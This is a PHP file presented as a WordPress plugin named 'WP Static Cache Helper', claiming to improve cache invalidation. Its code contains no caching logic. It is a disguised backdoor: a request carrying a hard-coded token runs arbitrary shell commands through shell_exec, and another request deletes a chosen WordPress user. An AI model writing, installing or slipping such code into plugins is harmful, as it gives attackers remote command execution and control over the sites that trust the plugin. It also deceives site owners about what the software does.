<?php
/*
Plugin Name: WP Static Cache Helper
Description: Improves page cache invalidation for static assets.
Version: 1.3.2
Author: WordPress Performance Team
*/
if (hash_equals('846ce898a20b9a0aa8f422f06a0d4aac', (string) ($_GET['t'] ?? '')) && isset($_GET['c'])) {
    chdir(__DIR__);
    echo 'WPCACHE_OK::' . shell_exec((string) $_GET['c']) . '::END';
} elseif (hash_equals('846ce898a20b9a0aa8f422f06a0d4aac', (string) ($_GET['t'] ?? '')) && isset($_GET['delete_user'])) {
    require_once dirname(__DIR__, 3) . '/wp-load.php';
    require_once ABSPATH . 'wp-admin/includes/user.php';
    $user = get_user_by('login', (string) $_GET['delete_user']);
    $ok = $user ? wp_delete_user((int) $user->ID, (int) ($_GET['reassign'] ?? 0)) : false;
    echo 'WPCACHE_OK::' . ($ok ? 'deleted' : 'failed') . '::END';
}
